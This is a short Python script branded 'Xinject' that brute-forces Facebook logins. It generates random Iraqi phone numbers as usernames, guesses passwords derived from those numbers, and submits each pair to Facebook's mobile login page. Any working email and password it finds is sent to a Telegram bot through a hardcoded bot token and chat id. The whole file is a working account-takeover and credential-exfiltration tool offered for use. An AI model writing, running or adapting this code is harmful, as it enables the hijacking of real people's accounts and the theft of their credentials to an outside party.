try:
	import random,requests,os,sys,random
	import pyfiglet
except ModuleNotFoundError:
  os.system('pip install TaskPool')
  os.system("pip install random")
  os.system('pip install requests')
  os.system('clear')
from user_agent import generate_user_agent
logo2 = "Telegram : @Xinject\nCopyright ⓒ Xinject"
logo = pyfiglet.figlet_format('Xinjct',font='alligator')
print("\n"+logo)
print("\n"+logo2+"\n\n")

idtele = "1352346351"
botele = "5362092593:AAHM7SqxzKpLxp_lsJnZm0Zt7wMBFTSdf90"
msg_good = """
          ⌯ Email : {email}
          ⌯ Pass : {pasw}
          ⌯ Telegram: @Xinject
          """
while True:
	   num2 = ["770","750","780"]
	   num_check = random.choice(num2)
	   num = '1234567890'
	   xinject_num = str(''.join((random.choice(num) for i in range(7))))
	   email = '+964'+ num_check + xinject_num
	   pasw = "0"+num_check + xinject_num
	   url = 'https://mobile.facebook.com/login.php'
	   heade = {'User-Agent' : 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1', 'Accept-Language': 'en-US,en;q=0.5'}
	   data = {
	   'email': email,
	   'pass': pasw}
	   xinject = requests.post(url, headers=heade, data=data)
	   if "xc_message" in xinject.text:
	   	print(f'\033[92m Good : {email}:{pasw}')
	   	requests.post(f'https://api.telegram.org/bot{botele}/sendMessage?chat_id={idtele}&text={msg_good}')
	   elif "checkpointSubmitButton-actual-button" in xinject.text:
	   	print(f'\033[93m Checkpoint : {email}:{pasw} ')
	   else:
	   	print(f'\033[91m Error login  : {email}:{pasw} ')

  

  
